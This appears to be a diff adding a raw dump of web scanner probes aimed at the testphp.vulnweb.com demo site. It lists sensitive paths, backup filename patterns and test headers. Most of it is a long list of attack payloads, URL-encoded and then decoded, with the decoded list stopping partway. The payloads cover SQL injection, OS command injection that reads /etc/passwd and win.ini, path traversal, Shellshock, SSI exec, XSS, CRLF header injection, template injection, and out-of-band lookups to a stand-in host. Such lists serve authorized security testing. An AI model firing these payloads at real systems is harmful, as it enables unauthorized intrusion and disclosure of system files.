@@ -1,0 +1,476 @@
+URL :  http://testphp.vulnweb.com/search.php?test=query 
+
+Directory/File Searching:
+    /elmah.axd
+    /.git/index
+    /crossdomain.xml
+    /clientaccesspolicy.xml
+    /.svn/text-base/
+    /WEB-INF/applicationContext.xml
+    /WEB-INF/classes/1/4/1.class
+    /WEB-INF/web.xml
+
+    Filename Prefix:
+        "Copy (2) of "
+        "Copy (3) of "
+        "Copy of "
+    Filename Postfix:
+        " - Copy (2)"
+        " - Copy (3)"
+        " - Copy"
+        "backup"
+        "-backup"
+        " backup"
+    Extension:
+        .bak
+        .bac
+        .backup
+        .log
+        .~bk
+        .old
+        .swp
+        ~
+        .tar
+        .jar
+        .zip
+
+Header:
+    Cookie: 0Lj3VVj82jFWLV5=wpvb1jeQJIWigTEzwgJBMBRDDwMmFPnPHkctSBCF
+    Cookie: 1DM6FZZR7i87tLW=v91lCjCdpROyj8V5X7uuPFdQyZw5Lg3sR1uyBy7e
+    Cookie: 4eBPczbt3S2lwv8=lDtDtEhv3yY97I4aSV7CqBDG9u8ZrWSSvcAmUiSI
+    Cookie: 7kwunVsotPkMLmb=gel49KPnQLJ6WRvpfHdMHlovrMJDqbl1soj2BujM
+    Cookie: cbg5gTRGLpPz1sZ=wkFhoJkZ9KTeZmMcpNwd4jxbrLVqlItZDLRrCUZa
+    Cookie: huleeSqs5asaR3R=cFMTxXoXp1qKMdj3iKG4kxpv1jPiRFNJSpHtAfkh
+    Cookie: IFhLYHG3apwX9Zl=Gvmhc316Z7aAkCisykdPB3AvT6nnTowXYuugzKKQ
+    Content-Length: 0
+    Content-Length: 75
+    Content-Length: 86
+    Content-Type: application/x-www-form-urlencoded
+    Max-Forwards: 0
+    Max-Forwards: 1
+    Max-Forwards: 2
+    Max-Forwards: 3
+    Request-Range: bytes=0-6
+    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+    User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
+    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+    User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+    User-Agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+    User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+    User-Agent: msnbot/1.1 (+http://search.msn.com/msnbot.htm)
+    ----------------------------------------------------------------------------
+    Proxy: fe80:0:0:0:d175:eaa9:f948:fc97%wlp3s0:46195
+    Proxy: 192.168.1.38:46195
+    Proxy: 0:0:0:0:0:0:0:1%lo:46195
+    Proxy: 127.0.0.1:46195
+    ----------------------------------------------------------------------------
+    Range: bytes=0-6
+    Request-Range: bytes=0-6
+    ----------------------------------------------------------------------------
+
+    
+Payloads URL-Encoded:
+    1 query%2526ABC%253DABCroxy 
+    2 00000000000000000000000000000000000000000000 
+    3 %00 
+    4 ABCtor222222 
+    5 110060760811587551.ABCtor.com
+    6 11111111111111111111111111111111111111111111 
+    7 20186550282379014796881139187073302102263595 
+    8 %22%27 
+    9 %22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 
+    10 %22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 
+    11 %22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+ 
+    12 %22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C 
+    13 %22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C 
+    14 %22+%7C+case+randomblob%281000000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%22 
+    15 %22+%7C+case+randomblob%28100000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%22 
+    16 %22+%7C+case+randomblob%2810000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%22 
+    17 %22+%7C+case+randomblob%281000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%22 
+    18 %22+%7C+case+randomblob%28100000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%22 
+    19 %22case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+ 
+    20 %22 
+    21 %22java.lang.Thread.sleep%22%2815000%29 
+    22 %24%7B216152%2B688191%7D 
+    23 %24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C 
+    24 %24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D 
+    25 %27%22%00%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E 
+    26 %27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E 
+    27 %27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 
+    28 %27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+ 
+    29 %27+%7C+case+randomblob%281000000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%27 
+    30 %27+%7C+case+randomblob%281000000000%29+when+not+null+then+%22%22+else+%22%22+end+-- 
+    31 %27+%7C+case+randomblob%28100000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%27 
+    32 %27+%7C+case+randomblob%28100000000%29+when+not+null+then+%22%22+else+%22%22+end+-- 
+    33 %27+%7C+case+randomblob%2810000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%27 
+    34 %27+%7C+case+randomblob%2810000000%29+when+not+null+then+%22%22+else+%22%22+end+-- 
+    35 %27+%7C+case+randomblob%281000000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%27 
+    36 %27+%7C+case+randomblob%281000000%29+when+not+null+then+%22%22+else+%22%22+end+-- 
+    37 %27+%7C+case+randomblob%28100000%29+when+not+null+then+%22%22+else+%22%22+end+%7C+%27 
+    38 %27+%7C+case+randomblob%28100000%29+when+not+null+then+%22%22+else+%22%22+end+-- 
+    39 %27case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+ 
+    40 %27 
+    41 %28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15 
+    42 %28%29+%7B+%3A%3B%7D%3B+echo+%27X-Powered-By%3A+ShellShock-Vulnerable%27 
+    43 %28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29 
+    44 %29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+ 
+    45 %29 
+    46 %2B 
+    47 %2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B 
+    48 %2F%2F110060760811587551.ABCtor.com
+    49 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 
+    50 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F 
+    51 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini 
+    52 %2Fetc%2Fpasswd 
+    53 %2F 
+    54 %2FWEB-INF%2Fweb.xml 
+    55 %3B 
+    56 %3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B 
+    57 %3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+ 
+    58 %3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E 
+    59 %3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E 
+    60 %3C%21-- 
+    61 %40 
+    62 5418m6sclgrwb32b91380kvfu7osn5u07wksemibz4akhsw8m1sy9hjf8uu9wbnyxi 
+    63 %5C%5C110060760811587551.ABCtor.com
+    64 ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini 
+    65 %5CWEB-INF%5Cweb.xml 
+    66 %5D%5D%3E 
+    67 %7C 
+    68 99999999999999999999999999999999999999999999 
+    69 ak95stvnnhz9q3p43b1plymmf0fj551vligmhgimo85ibtd1ejffctdq5ai4u2lk 
+    70 any%0ASet-cookie%3A+Tamper%3D5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    71 any%0D%0ASet-cookie%3A+Tamper%3D5e021b4e-98a1-4d37-8c49-47ef1883ffd8%0D%0A 
+    72 any%0D%0ASet-cookie%3A+Tamper%3D5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    73 any%3F%0ASet-cookie%3A+Tamper%3D5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    74 any%3F%0D%0ASet-cookie%3A+Tamper%3D5e021b4e-98a1-4d37-8c49-47ef1883ffd8%0D%0A 
+    75 any%3F%0D%0ASet-cookie%3A+Tamper%3D5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    76 c%3A%2F 
+    77 c%3A%2FWindows%2Fsystem.ini 
+    78 c%3A%5C 
+    79 c%3A%5CWindows%5Csystem.ini 
+    80 case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+ 
+    81 case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+-- 
+    82 case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+ 
+    83 case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+-- 
+    84 case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+ 
+    85 case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+-- 
+    86 case+randomblob%281000000%29+when+not+null+then+1+else+1+end+ 
+    87 case+randomblob%281000000%29+when+not+null+then+1+else+1+end+-- 
+    88 case+randomblob%28100000%29+when+not+null+then+1+else+1+end+ 
+    89 case+randomblob%28100000%29+when+not+null+then+1+else+1+end+-- 
+    90 case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end 
+    91 case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+ 
+    92 dzecwvjsnfdqblqegqpagakcotcdxwxdzdelze 
+    93 fgqpd8mzjf9bgyoxqfaqqe4pxa6m228d7ijz58iekcl390gvbh6e29oc5ypijtg8k 
+    94 hiz7j63gpobhs8hogqttw6efq1265tc5sxp9w0il5m5ua15xo4ck6d56g73buvui3rs8j 
+    95  
+    96 http%3A%2F%2F110060760811587551.ABCtor.com
+    97 HtTp%3A%2F%2F110060760811587551.ABCtor.com
+    98 http%3A%2F%2Fwww.google.com%2F 
+    99 http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DABCtor%2520ABC 
+    100 http%3A%2F%2Fwww.google.com%3A80%2F 
+    101 http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DABCtor%2520ABC 
+    102 http%3A%2F%2Fwww.google.com 
+    103 http%3A%5C%5C110060760811587551.ABCtor.com
+    104 https%3A%2F%2F110060760811587551.ABCtor.com
+    105 HtTpS%3A%2F%2F110060760811587551.ABCtor.com
+    106 https%3A%5C%5C110060760811587551.ABCtor.com
+    107 igef4bxt1wwth50cvu7y6rrbaxkj6nxiuiqit6igspj63gq7qp8y83dasxy 
+    108 m574yvd2zcbbh6g2jfjne3wbyxi14o3pdg14khlwt4qvgvdbhafoxzspztal 
+    109 qtcanslyn4clqe5bapu5l8mz7httdptjcrfac4ckyh8fobnrmwopesu0tnwzs6ll59 
+    110 queryABCtor222222 
+    111 query%22%26cat+%2Fetc%2Fpasswd%26%22 
+    112 query%22%26sleep+15%26%22 
+    113 query%22%26timeout+%2FT+15%26%22 
+    114 query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 
+    115 query%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22 
+    116 query%22+%2F+sleep%2815%29+%2F+%22 
+    117 query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 
+    118 query%22%3Bget-help 
+    119 query%22%3Bsleep+15%3B%22 
+    120 query%22%3Bstart-sleep+-s+15 
+    121 query%22%7Ctimeout+%2FT+15 
+    122 query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini 
+    123 query%22+and+0+in+%28select+sleep%2815%29+%29+--+ 
+    124 query%22 
+    125 query%22+UNION+ALL+select+NULL+--+ 
+    126 query%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+ 
+    127 query%26cat+%2Fetc%2Fpasswd%26 
+    128 query%26sleep+15%26 
+    129 query%26timeout+%2FT+15 
+    130 query%26type+%25SYSTEMROOT%25%5Cwin.ini 
+    131 query%27%26cat+%2Fetc%2Fpasswd%26%27 
+    132 query%27%26sleep+15%26%27 
+    133 query%27%26timeout+%2FT+15%26%27 
+    134 query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 
+    135 query%27%29+UNION+ALL+select+NULL+--+ 
+    136 query%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27 
+    137 query%27+%2F+sleep%2815%29+%2F+%27 
+    138 query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 
+    139 query%27%3Bget-help 
+    140 query%27%3Bsleep+15%3B%27 
+    141 query%27%3Bstart-sleep+-s+15 
+    142 query%27%7Ctimeout+%2FT+15 
+    143 query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini 
+    144 query%27+and+0+in+%28select+sleep%2815%29+%29+--+ 
+    145 query%27+AND+%271%27%3D%271%27+--+ 
+    146 query%27+AND+%271%27%3D%272%27+--+ 
+    147 query%27 
+    148 query%27+OR+%271%27%3D%271%27+--+ 
+    149 query%27+UNION+ALL+select+NULL+--+ 
+    150 query%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+ 
+    151 query%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+ 
+    152 query%29 
+    153 query%29+UNION+ALL+select+NULL+--+ 
+    154 query%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+ 
+    155 query+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+ 
+    156 query+%2F+case+when+cast%28pg_sleep%2815%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+ 
+    157 query+%2F+sleep%2815%29+ 
+    158 query%3Bcat+%2Fetc%2Fpasswd%3B 
+    159 query%3Bget-help+%23 
+    160 query%3Bget-help 
+    161 query%3B 
+    162 query%3Bsleep+15%3B 
+    163 query%3Bstart-sleep+-s+15+%23 
+    164 query%3Bstart-sleep+-s+15 
+    165 query%7Ctimeout+%2FT+15 
+    166 query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini 
+    167 query+and+0+in+%28select+sleep%2815%29+%29+--+ 
+    168 query+AND+1%3D1+--+ 
+    169 query+AND+1%3D2+--+ 
+    170 query+and+exists+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+--+ 
+    171 query 
+    172 query+OR+1%3D1+--+ 
+    173 query+UNION+ALL+select+NULL+--+ 
+    174 query+WAITFOR+DELAY+%270%3A0%3A15%27+--+ 
+    175 response.write%28100%2C000*100%2C000%29 
+    176 rjersfobpfy006pxikbjtmsiarkt4wc9znbpx3qk3di3sim473t5j9ndylyp 
+    177 Set-cookie%3A+Tamper%3D5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    178 shk3gp6e967ypei2lhl2q2cifh0y7peyn3y0hac70x2l7k3rlvpsm9n86y7mbh3vg9e 
+    179 thishouldnotexistandhopefullyitwillnot 
+    180 u36ugb454etpiqzzvz8np807alt17dxfxq9kwe5j5awzn30ajcqan7g21fl 
+    181 vcywenmrxjo4mo38b9o1rw0p4ptuyodcd4n69px7s2szuo9htaicptin3yvj26trh6gm 
+    182 vkrk9fvyeqknk595mmjp1xv0zcbblsgm8qjouaq9an5svge4uqh9hx188jgyg 
+    183 WEB-INF%2Fweb.xml 
+    184 WEB-INF%5Cweb.xml 
+    185 www.google.com%2F 
+    186 www.google.com%2Fsearch%3Fq%3DABCtor%2520ABC 
+    187 www.google.com%3A80%2F 
+    188 www.google.com%3A80%2Fsearch%3Fq%3DABCtor%2520ABC 
+    189 www.google.com 
+    190 z0xl8v2xn0s7dxmmztkp9ui3vs8hzg098k4akiunxcp9u0ed1hc82vmcm16np28qibt 
+    191 ABC+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A 
+    192 ABC%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A 
+    193 ABC 
+    194 ABCPX0sS
+
+
+
+--------------------------------------------------------------------------------
+Payloads URL-Decoded:
+    1 query%26ABC%3DABCroxy 
+    2 00000000000000000000000000000000000000000000 
+    3 . 
+    4 ABCtor222222 
+    5 110060760811587551.ABCtor.com
+    6 11111111111111111111111111111111111111111111 
+    7 20186550282379014796881139187073302102263595 
+    8 "' 
+    9 "+response.write([100,000*100,000)+" 
+    10 ";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=" 
+    11 "; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' --  
+    12 "><!--#EXEC cmd="dir \"-->< 
+    13 "><!--#EXEC cmd="ls /"-->< 
+    14 " | case randomblob(1000000000) when not null then "" else "" end | " 
+    15 " | case randomblob(100000000) when not null then "" else "" end | " 
+    16 " | case randomblob(10000000) when not null then "" else "" end | " 
+    17 " | case randomblob(1000000) when not null then "" else "" end | " 
+    18 " | case randomblob(100000) when not null then "" else "" end | " 
+    19 "case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end --  
+    20 " 
+    21 "java.lang.Thread.sleep"(15000) 
+    22 ${216152+688191} 
+    23 ${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\ 
+    24 ${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))} 
+    25 '".<script>alert(1);</script> 
+    26 '"<script>alert(1);</script> 
+    27 ';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=' 
+    28 '; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' --  
+    29 ' | case randomblob(1000000000) when not null then "" else "" end | ' 
+    30 ' | case randomblob(1000000000) when not null then "" else "" end -- 
+    31 ' | case randomblob(100000000) when not null then "" else "" end | ' 
+    32 ' | case randomblob(100000000) when not null then "" else "" end -- 
+    33 ' | case randomblob(10000000) when not null then "" else "" end | ' 
+    34 ' | case randomblob(10000000) when not null then "" else "" end -- 
+    35 ' | case randomblob(1000000) when not null then "" else "" end | ' 
+    36 ' | case randomblob(1000000) when not null then "" else "" end -- 
+    37 ' | case randomblob(100000) when not null then "" else "" end | ' 
+    38 ' | case randomblob(100000) when not null then "" else "" end -- 
+    39 'case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end --  
+    40 ' 
+    41 () { :;}; /bin/sleep 15 
+    42 () { :;}; echo 'X-Powered-By: ShellShock-Vulnerable' 
+    43 (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) 
+    44 ); select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' --  
+    45 ) 
+    46 + 
+    47 +response.write({0}*{1})+ 
+    48 //110060760811587551.ABCtor.com
+    49 ../../../../../../../../../../../../../../../../etc/passwd 
+    50 ../../../../../../../../../../../../../../../../ 
+    51 ../../../../../../../../../../../../../../../../Windows/system.ini 
+    52 /etc/passwd 
+    53 / 
+    54 /WEB-INF/web.xml 
+    55 ; 
+    56 ;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110)); 
+    57 ; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' --  
+    58 <!--#EXEC cmd="dir \"--> 
+    59 <!--#EXEC cmd="ls /"--> 
+    60 <!-- 
+    61 @ 
+    62 5418m6sclgrwb32b91380kvfu7osn5u07wksemibz4akhsw8m1sy9hjf8uu9wbnyxi 
+    63 \\110060760811587551.ABCtor.com
+    64 ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\system.ini 
+    65 \WEB-INF\web.xml 
+    66 ]]> 
+    67 | 
+    68 99999999999999999999999999999999999999999999 
+    69 ak95stvnnhz9q3p43b1plymmf0fj551vligmhgimo85ibtd1ejffctdq5ai4u2lk 
+    70 any
+    Set-cookie: Tamper=5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    71 any
+    Set-cookie: Tamper=5e021b4e-98a1-4d37-8c49-47ef1883ffd8
+
+    72 any
+    Set-cookie: Tamper=5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    73 any?
+    Set-cookie: Tamper=5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    74 any?
+    Set-cookie: Tamper=5e021b4e-98a1-4d37-8c49-47ef1883ffd8
+
+    75 any?
+    Set-cookie: Tamper=5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    76 c:/ 
+    77 c:/Windows/system.ini 
+    78 c:\ 
+    79 c:\Windows\system.ini 
+    80 case randomblob(1000000000) when not null then 1 else 1 end  
+    81 case randomblob(1000000000) when not null then 1 else 1 end -- 
+    82 case randomblob(100000000) when not null then 1 else 1 end  
+    83 case randomblob(100000000) when not null then 1 else 1 end -- 
+    84 case randomblob(10000000) when not null then 1 else 1 end  
+    85 case randomblob(10000000) when not null then 1 else 1 end -- 
+    86 case randomblob(1000000) when not null then 1 else 1 end  
+    87 case randomblob(1000000) when not null then 1 else 1 end -- 
+    88 case randomblob(100000) when not null then 1 else 1 end  
+    89 case randomblob(100000) when not null then 1 else 1 end -- 
+    90 case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end 
+    91 case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end --  
+    92 dzecwvjsnfdqblqegqpagakcotcdxwxdzdelze 
+    93 fgqpd8mzjf9bgyoxqfaqqe4pxa6m228d7ijz58iekcl390gvbh6e29oc5ypijtg8k 
+    94 hiz7j63gpobhs8hogqttw6efq1265tc5sxp9w0il5m5ua15xo4ck6d56g73buvui3rs8j 
+    95  
+    96 http://110060760811587551.ABCtor.com
+    97 HtTp://110060760811587551.ABCtor.com
+    98 http://www.google.com/ 
+    99 http://www.google.com/search?q=ABCtor%20ABC 
+    100 http://www.google.com:80/ 
+    101 http://www.google.com:80/search?q=ABCtor%20ABC 
+    102 http://www.google.com 
+    103 http:\\110060760811587551.ABCtor.com
+    104 https://110060760811587551.ABCtor.com
+    105 HtTpS://110060760811587551.ABCtor.com
+    106 https:\\110060760811587551.ABCtor.com
+    107 igef4bxt1wwth50cvu7y6rrbaxkj6nxiuiqit6igspj63gq7qp8y83dasxy 
+    108 m574yvd2zcbbh6g2jfjne3wbyxi14o3pdg14khlwt4qvgvdbhafoxzspztal 
+    109 qtcanslyn4clqe5bapu5l8mz7httdptjcrfac4ckyh8fobnrmwopesu0tnwzs6ll59 
+    110 queryABCtor222222 
+    111 query"&cat /etc/passwd&" 
+    112 query"&sleep 15&" 
+    113 query"&timeout /T 15&" 
+    114 query"&type %SYSTEMROOT%\win.ini&" 
+    115 query" / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / " 
+    116 query" / sleep(15) / " 
+    117 query";cat /etc/passwd;" 
+    118 query";get-help 
+    119 query";sleep 15;" 
+    120 query";start-sleep -s 15 
+    121 query"|timeout /T 15 
+    122 query"|type %SYSTEMROOT%\win.ini 
+    123 query" and 0 in (select sleep(15) ) --  
+    124 query" 
+    125 query" UNION ALL select NULL --  
+    126 query" WAITFOR DELAY '0:0:15' --  
+    127 query&cat /etc/passwd& 
+    128 query&sleep 15& 
+    129 query&timeout /T 15 
+    130 query&type %SYSTEMROOT%\win.ini 
+    131 query'&cat /etc/passwd&' 
+    132 query'&sleep 15&' 
+    133 query'&timeout /T 15&' 
+    134 query'&type %SYSTEMROOT%\win.ini&' 
+    135 query') UNION ALL select NULL --  
+    136 query' / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / ' 
+    137 query' / sleep(15) / ' 
+    138 query';cat /etc/passwd;' 
+    139 query';get-help 
+    140 query';sleep 15;' 
+    141 query';start-sleep -s 15 
+    142 query'|timeout /T 15 
+    143 query'|type %SYSTEMROOT%\win.ini 
+    144 query' and 0 in (select sleep(15) ) --  
+    145 query' AND '1'='1' --  
+    146 query' AND '1'='2' --  
+    147 query' 
+    148 query' OR '1'='1' --  
+    149 query' UNION ALL select NULL --  
+    150 query' WAITFOR DELAY '0:0:15' --  
+    151 query) ' WAITFOR DELAY '0:0:15' --  
+    152 query) 
+    153 query) UNION ALL select NULL --  
+    154 query) WAITFOR DELAY '0:0:15' --  
